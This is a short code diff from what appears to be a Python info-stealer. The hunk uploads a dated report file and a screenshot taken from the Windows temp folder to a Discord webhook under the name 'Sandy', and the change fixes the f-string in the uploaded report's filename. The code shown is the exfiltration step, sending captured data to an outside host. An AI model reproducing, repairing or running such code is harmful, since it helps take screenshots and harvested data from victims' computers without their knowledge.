@@ -126,7 +126,7 @@ get_screenshot()
 
 webhook = DiscordWebhook(url=WEBHOOK, username="Sandy")
 with open(f"report-{DATE}.txt", "rb") as f:
-    webhook.add_file(file=f.read(), filename='report-{DATE}.txt')
+    webhook.add_file(file=f.read(), filename=f'report-{DATE}.txt')
 with open(os.environ["temp"] +"\\s.png", "rb") as f:
     webhook.add_file(file=f.read(), filename='screenshot.png')
 
